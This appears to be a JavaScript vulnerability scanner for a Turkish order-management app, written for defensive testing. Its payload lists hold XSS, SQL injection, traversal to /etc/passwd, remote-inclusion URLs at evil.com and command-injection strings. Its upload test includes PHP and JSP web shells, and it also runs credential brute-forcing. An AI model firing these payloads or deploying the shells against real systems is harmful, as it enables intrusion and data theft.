/**
 * =============================================
 * AUTOMATED VULNERABILITY SCANNER
 * =============================================
 * 
 * Comprehensive vulnerability scanning for √ñmer G√ºll√º Sipari≈ü Sistemi
 * Integrates with multiple security tools and frameworks
 */

const axios = require('axios');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { exec } = require('child_process');
const { promisify } = require('util');

const execAsync = promisify(exec);

class VulnerabilityScanner {
    constructor(options = {}) {
        this.baseURL = options.baseURL || 'http://localhost:3000';
        this.output = options.output || './vulnerability-report.json';
        this.verbose = options.verbose || false;

        this.vulnerabilities = [];
        this.scanResults = {
            timestamp: new Date().toISOString(),
            target: this.baseURL,
            totalChecks: 0,
            vulnerabilitiesFound: 0,
            riskScore: 0,
            categories: {}
        };

        this.riskWeights = {
            CRITICAL: 10,
            HIGH: 7,
            MEDIUM: 4,
            LOW: 1,
            INFO: 0
        };

        // Common vulnerability payloads
        this.payloads = {
            xss: [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>',
                '<body onload=alert("XSS")>',
                '\"><script>alert(\"XSS\")</script>',
                '\'><script>alert(\'XSS\')</script>'
            ],
            sqli: [
                "' OR '1'='1",
                '" OR "1"="1',
                "'; DROP TABLE users; --",
                "' UNION SELECT null,null,null--",
                "1' AND (SELECT COUNT(*) FROM users) > 0--",
                "'; WAITFOR DELAY '00:00:05'--",
                "1' OR '1'='1' /*",
                "admin'--"
            ],
            lfi: [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '../../../etc/shadow',
                '../../../../etc/passwd%00',
                '../../../windows/win.ini'
            ],
            rfi: [
                'http://evil.com/shell.txt',
                'https://pastebin.com/raw/malicious',
                'ftp://evil.com/shell.php'
            ],
            cmdInjection: [
                '; ls -la',
                '&& dir',
                '| whoami',
                '`id`',
                '$(uname -a)',
                '; cat /etc/passwd',
                '&& type C:\\windows\\system32\\drivers\\etc\\hosts'
            ]
        };
    }

    /**
     * Run comprehensive vulnerability scan
     */
    async runScan() {
        console.log('üîç Starting Comprehensive Vulnerability Scan...\n');

        const scanCategories = [
            { name: 'Information Disclosure', method: this.scanInformationDisclosure },
            { name: 'Authentication Security', method: this.scanAuthentication },
            { name: 'Session Management', method: this.scanSessionManagement },
            { name: 'Input Validation', method: this.scanInputValidation },
            { name: 'SQL Injection', method: this.scanSQLInjection },
            { name: 'XSS Vulnerabilities', method: this.scanXSS },
            { name: 'File Inclusion', method: this.scanFileInclusion },
            { name: 'Command Injection', method: this.scanCommandInjection },
            { name: 'Business Logic', method: this.scanBusinessLogic },
            { name: 'API Security', method: this.scanAPISecurity },
            { name: 'SSL/TLS Security', method: this.scanSSLTLS },
            { name: 'HTTP Security Headers', method: this.scanSecurityHeaders },
            { name: 'File Upload Security', method: this.scanFileUpload },
            { name: 'Access Control', method: this.scanAccessControl },
            { name: 'Rate Limiting', method: this.scanRateLimiting }
        ];

        for (const category of scanCategories) {
            console.log(`üìã Scanning: ${category.name}...`);
            try {
                await category.method.call(this);
                this.log(`‚úÖ ${category.name} scan completed`);
            } catch (error) {
                this.log(`‚ùå ${category.name} scan failed: ${error.message}`);
                this.addVulnerability({
                    category: category.name,
                    severity: 'HIGH',
                    title: 'Scanner Error',
                    description: `Failed to complete ${category.name} scan: ${error.message}`,
                    risk: 'Scanner error may indicate security misconfiguration'
                });
            }
            console.log('');
        }

        await this.generateReport();
        console.log('üéØ Vulnerability scan completed!');
    }

    /**
     * Scan for information disclosure vulnerabilities
     */
    async scanInformationDisclosure() {
        const infoEndpoints = [
            '/robots.txt',
            '/.git/config',
            '/.env',
            '/package.json',
            '/composer.json',
            '/.htaccess',
            '/web.config',
            '/phpinfo.php',
            '/server-status',
            '/server-info',
            '/admin',
            '/administrator',
            '/backup',
            '/backups',
            '/test',
            '/debug',
            '/.well-known/security.txt'
        ];

        for (const endpoint of infoEndpoints) {
            try {
                const response = await this.makeRequest('GET', endpoint);

                if (response.status === 200) {
                    let severity = 'LOW';
                    let description = `Information disclosure: ${endpoint} is accessible`;

                    // Check for sensitive content
                    const sensitivePatterns = [
                        /password/i,
                        /secret/i,
                        /api[_-]?key/i,
                        /database/i,
                        /connection/i,
                        /\.git/i,
                        /admin/i,
                        /debug/i
                    ];

                    const content = response.data.toLowerCase();
                    const foundSensitive = sensitivePatterns.some(pattern => pattern.test(content));

                    if (foundSensitive) {
                        severity = 'MEDIUM';
                        description += ' and contains potentially sensitive information';
                    }

                    this.addVulnerability({
                        category: 'Information Disclosure',
                        severity,
                        title: `Information Disclosure: ${endpoint}`,
                        description,
                        url: this.baseURL + endpoint,
                        risk: 'Information leakage can help attackers in reconnaissance'
                    });
                }
            } catch (error) {
                // Expected for most endpoints
            }
        }

        // Check for verbose error messages
        try {
            const response = await this.makeRequest('GET', '/api/nonexistent-endpoint');
            if (response.data && typeof response.data === 'string') {
                const errorPatterns = [
                    /stack trace/i,
                    /file not found.*line \d+/i,
                    /postgresql/i,
                    /mysql/i,
                    /database.*error/i,
                    /internal server error.*debug/i
                ];

                const hasVerboseError = errorPatterns.some(pattern => pattern.test(response.data));
                if (hasVerboseError) {
                    this.addVulnerability({
                        category: 'Information Disclosure',
                        severity: 'MEDIUM',
                        title: 'Verbose Error Messages',
                        description: 'Application returns detailed error messages that may reveal system information',
                        risk: 'Information leakage can aid in system fingerprinting and attack planning'
                    });
                }
            }
        } catch (error) {
            // Expected
        }
    }

    /**
     * Scan authentication mechanisms
     */
    async scanAuthentication() {
        // Test weak credential policies
        const weakPasswords = ['123456', 'password', 'admin', 'test', '12345678', 'qwerty'];
        const commonUsernames = ['admin', 'administrator', 'root', 'test', 'demo', 'guest'];

        for (const username of commonUsernames) {
            for (const password of weakPasswords) {
                try {
                    const response = await this.makeRequest('POST', '/api/auth/login', {
                        kullaniciAdi: username,
                        sifre: password
                    });

                    if (response.status === 200) {
                        this.addVulnerability({
                            category: 'Authentication',
                            severity: 'CRITICAL',
                            title: 'Weak Default Credentials',
                            description: `Weak credentials found: ${username}/${password}`,
                            risk: 'Attackers can gain unauthorized access using default credentials'
                        });
                    }
                } catch (error) {
                    // Expected for invalid credentials
                }
            }
        }

        // Test brute force protection
        const testUser = 'bruteforce_test_user';
        let consecutiveFailures = 0;

        for (let i = 0; i < 10; i++) {
            try {
                const response = await this.makeRequest('POST', '/api/auth/login', {
                    kullaniciAdi: testUser,
                    sifre: `wrongpassword${i}`
                });

                if (response.status === 401) {
                    consecutiveFailures++;
                } else if (response.status === 429) {
                    // Rate limiting activated
                    break;
                }
            } catch (error) {
                if (error.response && error.response.status === 429) {
                    break;
                }
                consecutiveFailures++;
            }
        }

        if (consecutiveFailures >= 10) {
            this.addVulnerability({
                category: 'Authentication',
                severity: 'HIGH',
                title: 'Insufficient Brute Force Protection',
                description: 'No rate limiting or account lockout detected after multiple failed login attempts',
                risk: 'Attackers can perform brute force attacks against user accounts'
            });
        }

        // Test JWT token security
        try {
            const response = await this.makeRequest('GET', '/api/auth/users', null, {
                'Authorization': 'Bearer invalid_jwt_token'
            });

            if (response.status === 200) {
                this.addVulnerability({
                    category: 'Authentication',
                    severity: 'CRITICAL',
                    title: 'JWT Token Validation Bypass',
                    description: 'Invalid JWT tokens are being accepted',
                    risk: 'Attackers can forge authentication tokens'
                });
            }
        } catch (error) {
            // Expected
        }
    }

    /**
     * Scan session management
     */
    async scanSessionManagement() {
        // Test session fixation
        try {
            // Get a session before login
            const preLoginResponse = await this.makeRequest('GET', '/api/auth/csrf');
            const preLoginCookies = this.extractCookies(preLoginResponse);

            // Login with valid credentials (would need real test credentials)
            // const loginResponse = await this.makeRequest('POST', '/api/auth/login', ...);

            // Check if session ID changed after login
            // This would require more sophisticated cookie handling
        } catch (error) {
            // Test methodology noted for manual verification
        }

        // Test concurrent session limits
        // Would require multiple authenticated sessions to test properly

        // Test session timeout
        try {
            const expiredToken = this.generateExpiredJWT();
            const response = await this.makeRequest('GET', '/api/auth/users', null, {
                'Authorization': `Bearer ${expiredToken}`
            });

            if (response.status === 200) {
                this.addVulnerability({
                    category: 'Session Management',
                    severity: 'HIGH',
                    title: 'Expired Token Acceptance',
                    description: 'Expired JWT tokens are being accepted',
                    risk: 'Attackers can use old tokens indefinitely'
                });
            }
        } catch (error) {
            // Expected
        }
    }

    /**
     * Scan for input validation issues
     */
    async scanInputValidation() {
        const testEndpoints = [
            { method: 'POST', path: '/api/auth/users', field: 'adiSoyadi' },
            { method: 'POST', path: '/api/cari', field: 'ad' },
            { method: 'POST', path: '/api/siparis', field: 'notlar' },
            { method: 'GET', path: '/api/auth/users', field: 'search' }
        ];

        for (const endpoint of testEndpoints) {
            for (const payload of this.payloads.xss) {
                try {
                    let data = {};
                    if (endpoint.method === 'GET') {
                        // Test in query parameters
                        const response = await this.makeRequest(endpoint.method,
                            `${endpoint.path}?${endpoint.field}=${encodeURIComponent(payload)}`);

                        if (response.data && response.data.includes(payload)) {
                            this.addVulnerability({
                                category: 'Input Validation',
                                severity: 'HIGH',
                                title: 'Reflected XSS in Query Parameter',
                                description: `XSS payload reflected in ${endpoint.path}?${endpoint.field}`,
                                payload: payload,
                                risk: 'Attackers can execute malicious scripts in user browsers'
                            });
                        }
                    } else {
                        // Test in POST body
                        data[endpoint.field] = payload;
                        if (endpoint.path === '/api/auth/users') {
                            data = { ...data, email: 'test@test.com', telefon: '05321234567', rol: 'VIEWER' };
                        }

                        const response = await this.makeRequest(endpoint.method, endpoint.path, data);

                        // Check if payload is reflected without sanitization
                        if (response.data && JSON.stringify(response.data).includes(payload)) {
                            this.addVulnerability({
                                category: 'Input Validation',
                                severity: 'HIGH',
                                title: 'Stored/Reflected XSS',
                                description: `XSS payload not sanitized in ${endpoint.path}`,
                                payload: payload,
                                risk: 'Attackers can execute malicious scripts'
                            });
                        }
                    }
                } catch (error) {
                    // Check for error-based vulnerabilities
                    if (error.response && error.response.data &&
                        error.response.data.includes && error.response.data.includes(payload)) {
                        this.addVulnerability({
                            category: 'Input Validation',
                            severity: 'MEDIUM',
                            title: 'XSS in Error Messages',
                            description: `XSS payload reflected in error message for ${endpoint.path}`,
                            payload: payload,
                            risk: 'Error-based XSS can be exploited'
                        });
                    }
                }
            }
        }
    }

    /**
     * Scan for SQL injection vulnerabilities
     */
    async scanSQLInjection() {
        const testEndpoints = [
            { method: 'GET', path: '/api/auth/users', params: ['search', 'id'] },
            { method: 'GET', path: '/api/cari', params: ['search', 'musteriKodu'] },
            { method: 'GET', path: '/api/siparis', params: ['search', 'musteriId'] },
            { method: 'POST', path: '/api/auth/login', fields: ['kullaniciAdi', 'sifre'] }
        ];

        for (const endpoint of testEndpoints) {
            const testFields = endpoint.params || endpoint.fields;

            for (const field of testFields) {
                for (const payload of this.payloads.sqli) {
                    try {
                        let response;

                        if (endpoint.method === 'GET') {
                            const url = `${endpoint.path}?${field}=${encodeURIComponent(payload)}`;
                            response = await this.makeRequest('GET', url);
                        } else {
                            const data = {};
                            data[field] = payload;
                            response = await this.makeRequest(endpoint.method, endpoint.path, data);
                        }

                        // Check for SQL error indicators
                        const sqlErrorPatterns = [
                            /sql syntax.*error/i,
                            /mysql.*error/i,
                            /postgresql.*error/i,
                            /oracle.*error/i,
                            /sqlite.*error/i,
                            /syntax error.*unexpected/i,
                            /unterminated quoted string/i,
                            /column.*doesn't exist/i,
                            /table.*doesn't exist/i
                        ];

                        const responseText = JSON.stringify(response.data);
                        const hasSQLError = sqlErrorPatterns.some(pattern => pattern.test(responseText));

                        if (hasSQLError) {
                            this.addVulnerability({
                                category: 'SQL Injection',
                                severity: 'CRITICAL',
                                title: 'SQL Injection Vulnerability',
                                description: `SQL injection detected in ${endpoint.path} parameter: ${field}`,
                                payload: payload,
                                risk: 'Attackers can access, modify, or delete database data'
                            });
                        }

                        // Check for boolean-based blind SQL injection indicators
                        if (payload.includes("'1'='1") && response.data &&
                            Array.isArray(response.data.data) && response.data.data.length > 0) {

                            // Test with false condition
                            const falsePayload = payload.replace("'1'='1", "'1'='0");
                            const falseResponse = await this.makeRequest(endpoint.method,
                                endpoint.method === 'GET' ?
                                    `${endpoint.path}?${field}=${encodeURIComponent(falsePayload)}` :
                                    endpoint.path,
                                endpoint.method === 'GET' ? null : { [field]: falsePayload }
                            );

                            const trueResults = response.data.data.length;
                            const falseResults = falseResponse.data.data ? falseResponse.data.data.length : 0;

                            if (trueResults > falseResults) {
                                this.addVulnerability({
                                    category: 'SQL Injection',
                                    severity: 'HIGH',
                                    title: 'Boolean-based Blind SQL Injection',
                                    description: `Boolean-based blind SQL injection in ${endpoint.path} parameter: ${field}`,
                                    payload: payload,
                                    risk: 'Attackers can extract data through boolean queries'
                                });
                            }
                        }

                    } catch (error) {
                        // Check for error-based SQL injection
                        if (error.response && error.response.data) {
                            const errorText = JSON.stringify(error.response.data);
                            const sqlErrorPatterns = [
                                /sql syntax.*error/i,
                                /mysql.*error/i,
                                /postgresql.*error/i,
                                /database.*error/i
                            ];

                            const hasSQLError = sqlErrorPatterns.some(pattern => pattern.test(errorText));
                            if (hasSQLError) {
                                this.addVulnerability({
                                    category: 'SQL Injection',
                                    severity: 'CRITICAL',
                                    title: 'Error-based SQL Injection',
                                    description: `SQL injection detected in ${endpoint.path} parameter: ${field}`,
                                    payload: payload,
                                    risk: 'Attackers can extract database information through error messages'
                                });
                            }
                        }
                    }
                }
            }
        }
    }

    /**
     * Scan for XSS vulnerabilities
     */
    async scanXSS() {
        // Already covered in input validation, but adding specific XSS context tests
        const contextPayloads = {
            htmlContext: ['<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>'],
            attributeContext: ['" onmouseover="alert(\'XSS\')"', '\' onmouseover=\'alert("XSS")\''],
            javascriptContext: ['";alert("XSS");//', '\';alert(\'XSS\');//'],
            cssContext: ['expression(alert("XSS"))', 'javascript:alert("XSS")']
        };

        // Test different XSS contexts
        for (const [context, payloads] of Object.entries(contextPayloads)) {
            for (const payload of payloads) {
                try {
                    const response = await this.makeRequest('GET',
                        `/api/auth/users?search=${encodeURIComponent(payload)}`);

                    if (response.data && JSON.stringify(response.data).includes(payload)) {
                        this.addVulnerability({
                            category: 'XSS',
                            severity: 'HIGH',
                            title: `XSS in ${context}`,
                            description: `XSS payload not sanitized in ${context}`,
                            payload: payload,
                            risk: 'Cross-site scripting can lead to session hijacking, data theft'
                        });
                    }
                } catch (error) {
                    // Expected
                }
            }
        }
    }

    /**
     * Scan for file inclusion vulnerabilities
     */
    async scanFileInclusion() {
        const fileEndpoints = [
            '/api/files/',
            '/api/download/',
            '/files/',
            '/uploads/'
        ];

        for (const endpoint of fileEndpoints) {
            for (const payload of this.payloads.lfi) {
                try {
                    const response = await this.makeRequest('GET', endpoint + payload);

                    if (response.status === 200 && response.data) {
                        // Check for signs of successful file inclusion
                        const lfiIndicators = [
                            /root:.*:0:0:/,  // /etc/passwd
                            /\[boot loader\]/i,  // boot.ini
                            /127\.0\.0\.1/,  // hosts file
                            /for 16-bit app support/i  // win.ini
                        ];

                        const hasLFI = lfiIndicators.some(pattern => pattern.test(response.data));
                        if (hasLFI) {
                            this.addVulnerability({
                                category: 'File Inclusion',
                                severity: 'CRITICAL',
                                title: 'Local File Inclusion',
                                description: `LFI vulnerability in ${endpoint}`,
                                payload: payload,
                                risk: 'Attackers can read arbitrary files from the server'
                            });
                        }
                    }
                } catch (error) {
                    // Expected
                }
            }

            // Test for RFI
            for (const payload of this.payloads.rfi) {
                try {
                    const response = await this.makeRequest('GET', endpoint + payload);

                    if (response.status === 200) {
                        this.addVulnerability({
                            category: 'File Inclusion',
                            severity: 'CRITICAL',
                            title: 'Remote File Inclusion',
                            description: `RFI vulnerability in ${endpoint}`,
                            payload: payload,
                            risk: 'Attackers can execute remote code'
                        });
                    }
                } catch (error) {
                    // Expected
                }
            }
        }
    }

    /**
     * Scan for command injection vulnerabilities
     */
    async scanCommandInjection() {
        const testEndpoints = [
            '/api/system/',
            '/api/admin/',
            '/api/debug/',
            '/api/tools/'
        ];

        for (const endpoint of testEndpoints) {
            for (const payload of this.payloads.cmdInjection) {
                try {
                    const response = await this.makeRequest('POST', endpoint, {
                        command: payload,
                        input: payload,
                        file: payload
                    });

                    // Check for command execution indicators
                    const cmdIndicators = [
                        /uid=\d+.*gid=\d+/,  // id command output
                        /Linux.*\d+\.\d+/,   // uname output
                        /Volume.*Serial Number/i,  // Windows dir output
                        /\d+:\d+:\d+.*up/    // uptime output
                    ];

                    const responseText = JSON.stringify(response.data);
                    const hasCmd = cmdIndicators.some(pattern => pattern.test(responseText));

                    if (hasCmd) {
                        this.addVulnerability({
                            category: 'Command Injection',
                            severity: 'CRITICAL',
                            title: 'Command Injection Vulnerability',
                            description: `Command injection detected in ${endpoint}`,
                            payload: payload,
                            risk: 'Attackers can execute arbitrary system commands'
                        });
                    }
                } catch (error) {
                    // Expected
                }
            }
        }
    }

    /**
     * Scan business logic vulnerabilities
     */
    async scanBusinessLogic() {
        // Test price manipulation
        try {
            const response = await this.makeRequest('POST', '/api/siparis', {
                musteriId: 1,
                items: [{
                    urunId: 1,
                    miktar: 1,
                    birimFiyat: 0.01  // Suspiciously low price
                }]
            });

            if (response.status === 200) {
                this.addVulnerability({
                    category: 'Business Logic',
                    severity: 'HIGH',
                    title: 'Price Manipulation Vulnerability',
                    description: 'Application accepts manipulated product prices',
                    risk: 'Attackers can create orders with artificially low prices'
                });
            }
        } catch (error) {
            // Expected
        }

        // Test negative quantity
        try {
            const response = await this.makeRequest('POST', '/api/siparis', {
                musteriId: 1,
                items: [{
                    urunId: 1,
                    miktar: -1,  // Negative quantity
                    birimFiyat: 100
                }]
            });

            if (response.status === 200) {
                this.addVulnerability({
                    category: 'Business Logic',
                    severity: 'MEDIUM',
                    title: 'Negative Quantity Acceptance',
                    description: 'Application accepts negative quantities in orders',
                    risk: 'Could lead to incorrect inventory calculations'
                });
            }
        } catch (error) {
            // Expected
        }
    }

    /**
     * Scan API security
     */
    async scanAPISecurity() {
        // Test HTTP verb tampering
        const verbTests = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'];

        for (const verb of verbTests) {
            try {
                const response = await this.makeRequest(verb, '/api/auth/users');

                if (verb === 'OPTIONS' && response.status === 200) {
                    // Check for CORS misconfigurations
                    const corsHeaders = response.headers;
                    if (corsHeaders['access-control-allow-origin'] === '*' &&
                        corsHeaders['access-control-allow-credentials'] === 'true') {
                        this.addVulnerability({
                            category: 'API Security',
                            severity: 'HIGH',
                            title: 'CORS Misconfiguration',
                            description: 'Dangerous CORS configuration allows any origin with credentials',
                            risk: 'Can lead to cross-origin attacks'
                        });
                    }
                }
            } catch (error) {
                // Expected
            }
        }

        // Test API versioning
        const versionTests = ['/api/v1/', '/api/v2/', '/v1/api/', '/v2/api/'];

        for (const version of versionTests) {
            try {
                const response = await this.makeRequest('GET', version + 'auth/users');
                if (response.status === 200) {
                    this.addVulnerability({
                        category: 'API Security',
                        severity: 'LOW',
                        title: 'API Version Disclosure',
                        description: `API version endpoint accessible: ${version}`,
                        risk: 'May expose deprecated or vulnerable API versions'
                    });
                }
            } catch (error) {
                // Expected
            }
        }
    }

    /**
     * Scan SSL/TLS configuration
     */
    async scanSSLTLS() {
        if (!this.baseURL.startsWith('https://')) {
            this.addVulnerability({
                category: 'SSL/TLS',
                severity: 'HIGH',
                title: 'HTTPS Not Enforced',
                description: 'Application is accessible over HTTP',
                risk: 'Data transmission is not encrypted'
            });
            return;
        }

        try {
            // Test SSL certificate
            const url = new URL(this.baseURL);
            await new Promise((resolve, reject) => {
                const req = https.request({
                    hostname: url.hostname,
                    port: url.port || 443,
                    method: 'GET',
                    rejectUnauthorized: true
                }, resolve);

                req.on('error', reject);
                req.end();
            });
        } catch (error) {
            if (error.code === 'CERT_HAS_EXPIRED') {
                this.addVulnerability({
                    category: 'SSL/TLS',
                    severity: 'HIGH',
                    title: 'Expired SSL Certificate',
                    description: 'SSL certificate has expired',
                    risk: 'Users will receive security warnings'
                });
            } else if (error.code === 'SELF_SIGNED_CERT_IN_CHAIN') {
                this.addVulnerability({
                    category: 'SSL/TLS',
                    severity: 'MEDIUM',
                    title: 'Self-Signed Certificate',
                    description: 'SSL certificate is self-signed',
                    risk: 'Users cannot verify authenticity'
                });
            }
        }
    }

    /**
     * Scan security headers
     */
    async scanSecurityHeaders() {
        try {
            const response = await this.makeRequest('GET', '/');
            const headers = response.headers;

            const securityHeaders = {
                'x-frame-options': 'X-Frame-Options header missing',
                'x-content-type-options': 'X-Content-Type-Options header missing',
                'x-xss-protection': 'X-XSS-Protection header missing',
                'strict-transport-security': 'Strict-Transport-Security header missing',
                'content-security-policy': 'Content-Security-Policy header missing',
                'referrer-policy': 'Referrer-Policy header missing'
            };

            for (const [header, description] of Object.entries(securityHeaders)) {
                if (!headers[header]) {
                    this.addVulnerability({
                        category: 'Security Headers',
                        severity: 'MEDIUM',
                        title: 'Missing Security Header',
                        description: description,
                        risk: 'Increases attack surface for client-side attacks'
                    });
                }
            }

            // Check for information disclosure headers
            const infoHeaders = ['server', 'x-powered-by', 'x-aspnet-version'];
            for (const header of infoHeaders) {
                if (headers[header]) {
                    this.addVulnerability({
                        category: 'Information Disclosure',
                        severity: 'LOW',
                        title: 'Information Disclosure Header',
                        description: `${header} header reveals system information: ${headers[header]}`,
                        risk: 'Helps attackers in system fingerprinting'
                    });
                }
            }

        } catch (error) {
            // Expected
        }
    }

    /**
     * Scan file upload security
     */
    async scanFileUpload() {
        const uploadEndpoints = [
            '/api/excel/upload/kullanici',
            '/api/excel/upload/cari',
            '/api/upload/',
            '/upload/',
            '/files/upload'
        ];

        for (const endpoint of uploadEndpoints) {
            // Test malicious file upload
            const maliciousFiles = [
                { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/php' },
                { name: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', type: 'application/jsp' },
                { name: 'script.js', content: 'require("child_process").exec(process.argv[2]);', type: 'application/javascript' }
            ];

            for (const file of maliciousFiles) {
                try {
                    // Create form data
                    const formData = new FormData();
                    const blob = new Blob([file.content], { type: file.type });
                    formData.append('file', blob, file.name);

                    const response = await axios.post(this.baseURL + endpoint, formData, {
                        headers: {
                            'Content-Type': 'multipart/form-data'
                        },
                        timeout: 10000
                    });

                    if (response.status === 200) {
                        this.addVulnerability({
                            category: 'File Upload',
                            severity: 'CRITICAL',
                            title: 'Malicious File Upload',
                            description: `Malicious file ${file.name} uploaded successfully to ${endpoint}`,
                            risk: 'Attackers can upload and execute malicious code'
                        });
                    }
                } catch (error) {
                    // Expected for secure implementations
                }
            }

            // Test file size limits
            try {
                const largeFile = Buffer.alloc(50 * 1024 * 1024); // 50MB
                const formData = new FormData();
                formData.append('file', largeFile, 'large.xlsx');

                const response = await axios.post(this.baseURL + endpoint, formData, {
                    headers: {
                        'Content-Type': 'multipart/form-data'
                    },
                    timeout: 30000
                });

                if (response.status === 200) {
                    this.addVulnerability({
                        category: 'File Upload',
                        severity: 'MEDIUM',
                        title: 'No File Size Limit',
                        description: `Large file (50MB) uploaded successfully to ${endpoint}`,
                        risk: 'DoS attacks through resource exhaustion'
                    });
                }
            } catch (error) {
                // Expected for secure implementations
            }
        }
    }

    /**
     * Scan access control mechanisms
     */
    async scanAccessControl() {
        // Test for default or weak access controls
        const sensitiveEndpoints = [
            '/api/admin/',
            '/api/system/',
            '/api/config/',
            '/admin/',
            '/administrator/',
            '/manager/',
            '/control-panel/'
        ];

        for (const endpoint of sensitiveEndpoints) {
            try {
                const response = await this.makeRequest('GET', endpoint);

                if (response.status === 200) {
                    this.addVulnerability({
                        category: 'Access Control',
                        severity: 'HIGH',
                        title: 'Unprotected Administrative Interface',
                        description: `Administrative interface accessible without authentication: ${endpoint}`,
                        risk: 'Unauthorized access to administrative functions'
                    });
                }
            } catch (error) {
                // Expected
            }
        }
    }

    /**
     * Scan rate limiting mechanisms
     */
    async scanRateLimiting() {
        const testEndpoint = '/api/dropdown';
        const requestCount = 150; // Exceed typical rate limits
        const requests = [];

        console.log(`    Testing rate limiting with ${requestCount} requests...`);

        for (let i = 0; i < requestCount; i++) {
            requests.push(this.makeRequest('GET', testEndpoint));
        }

        try {
            const responses = await Promise.allSettled(requests);
            const rateLimitedCount = responses.filter(r =>
                r.status === 'fulfilled' && r.value.status === 429
            ).length;

            if (rateLimitedCount === 0) {
                this.addVulnerability({
                    category: 'Rate Limiting',
                    severity: 'MEDIUM',
                    title: 'Insufficient Rate Limiting',
                    description: `No rate limiting detected after ${requestCount} requests`,
                    risk: 'Application vulnerable to DoS attacks'
                });
            } else {
                this.log(`    ‚úÖ Rate limiting activated after ${requestCount - rateLimitedCount} requests`);
            }
        } catch (error) {
            this.log(`    ‚ö†Ô∏è Rate limiting test error: ${error.message}`);
        }
    }

    /**
     * Helper method to make HTTP requests
     */
    async makeRequest(method, path, data = null, headers = {}) {
        const config = {
            method,
            url: this.baseURL + path,
            headers: {
                'User-Agent': 'Security-Scanner/1.0',
                ...headers
            },
            timeout: 10000,
            validateStatus: () => true // Don't throw on HTTP error codes
        };

        if (data) {
            config.data = data;
            if (!headers['Content-Type']) {
                config.headers['Content-Type'] = 'application/json';
            }
        }

        this.scanResults.totalChecks++;
        return await axios(config);
    }

    /**
     * Add vulnerability to results
     */
    addVulnerability(vuln) {
        this.vulnerabilities.push({
            ...vuln,
            id: crypto.randomUUID(),
            timestamp: new Date().toISOString()
        });

        this.scanResults.vulnerabilitiesFound++;
        this.scanResults.riskScore += this.riskWeights[vuln.severity] || 0;

        if (!this.scanResults.categories[vuln.category]) {
            this.scanResults.categories[vuln.category] = 0;
        }
        this.scanResults.categories[vuln.category]++;

        this.log(`    üö® ${vuln.severity}: ${vuln.title}`);
    }

    /**
     * Generate expired JWT for testing
     */
    generateExpiredJWT() {
        const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64');
        const payload = Buffer.from(JSON.stringify({
            sub: 'test_user',
            exp: Math.floor(Date.now() / 1000) - 3600 // Expired 1 hour ago
        })).toString('base64');
        const signature = 'expired_signature';

        return `${header}.${payload}.${signature}`;
    }

    /**
     * Extract cookies from response
     */
    extractCookies(response) {
        const setCookieHeader = response.headers['set-cookie'];
        if (!setCookieHeader) return {};

        const cookies = {};
        setCookieHeader.forEach(cookie => {
            const [nameValue] = cookie.split(';');
            const [name, value] = nameValue.split('=');
            cookies[name.trim()] = value ? value.trim() : '';
        });

        return cookies;
    }

    /**
     * Generate comprehensive vulnerability report
     */
    async generateReport() {
        const report = {
            ...this.scanResults,
            vulnerabilities: this.vulnerabilities,
            summary: this.generateSummary(),
            recommendations: this.generateRecommendations()
        };

        // Write to file
        await fs.promises.writeFile(this.output, JSON.stringify(report, null, 2));

        console.log('\nüìä VULNERABILITY SCAN REPORT');
        console.log('====================================');
        console.log(`üéØ Target: ${this.baseURL}`);
        console.log(`üìÖ Scan Date: ${report.timestamp}`);
        console.log(`üîç Total Checks: ${report.totalChecks}`);
        console.log(`üö® Vulnerabilities Found: ${report.vulnerabilitiesFound}`);
        console.log(`üìä Risk Score: ${report.riskScore}/100`);

        console.log('\nüìã Vulnerability Breakdown:');
        const severityCounts = {};
        this.vulnerabilities.forEach(vuln => {
            severityCounts[vuln.severity] = (severityCounts[vuln.severity] || 0) + 1;
        });

        Object.entries(severityCounts).forEach(([severity, count]) => {
            const emoji = { CRITICAL: 'üî¥', HIGH: 'üü†', MEDIUM: 'üü°', LOW: 'üü¢', INFO: '‚ÑπÔ∏è' }[severity];
            console.log(`   ${emoji} ${severity}: ${count}`);
        });

        console.log('\nüìÅ Category Breakdown:');
        Object.entries(report.categories).forEach(([category, count]) => {
            console.log(`   üìÇ ${category}: ${count}`);
        });

        console.log(`\nüìÑ Detailed report saved to: ${this.output}`);

        return report;
    }

    /**
     * Generate security summary
     */
    generateSummary() {
        const total = this.vulnerabilities.length;
        const critical = this.vulnerabilities.filter(v => v.severity === 'CRITICAL').length;
        const high = this.vulnerabilities.filter(v => v.severity === 'HIGH').length;

        let overallRisk = 'LOW';
        if (critical > 0) overallRisk = 'CRITICAL';
        else if (high > 0) overallRisk = 'HIGH';
        else if (total > 5) overallRisk = 'MEDIUM';

        return {
            overallRisk,
            totalVulnerabilities: total,
            criticalVulnerabilities: critical,
            highVulnerabilities: high,
            riskScore: this.scanResults.riskScore,
            securityGrade: this.calculateSecurityGrade()
        };
    }

    /**
     * Calculate security grade
     */
    calculateSecurityGrade() {
        const score = Math.max(0, 100 - this.scanResults.riskScore);

        if (score >= 90) return 'A';
        if (score >= 80) return 'B';
        if (score >= 70) return 'C';
        if (score >= 60) return 'D';
        return 'F';
    }

    /**
     * Generate security recommendations
     */
    generateRecommendations() {
        const recommendations = [];

        const categoryRecommendations = {
            'SQL Injection': 'Implement parameterized queries and input validation',
            'XSS': 'Implement output encoding and Content Security Policy',
            'Authentication': 'Strengthen password policies and implement MFA',
            'Session Management': 'Implement secure session handling and timeout',
            'File Upload': 'Implement file type validation and upload restrictions',
            'Access Control': 'Implement proper authorization checks',
            'Information Disclosure': 'Remove verbose error messages and system information',
            'Security Headers': 'Implement all recommended security headers',
            'SSL/TLS': 'Update SSL configuration and certificates',
            'Rate Limiting': 'Implement proper rate limiting and DoS protection',
            'Business Logic': 'Implement business rule validation',
            'API Security': 'Secure API endpoints and implement proper versioning'
        };

        Object.keys(this.scanResults.categories).forEach(category => {
            if (categoryRecommendations[category]) {
                recommendations.push({
                    category,
                    recommendation: categoryRecommendations[category],
                    priority: this.vulnerabilities.filter(v => v.category === category)
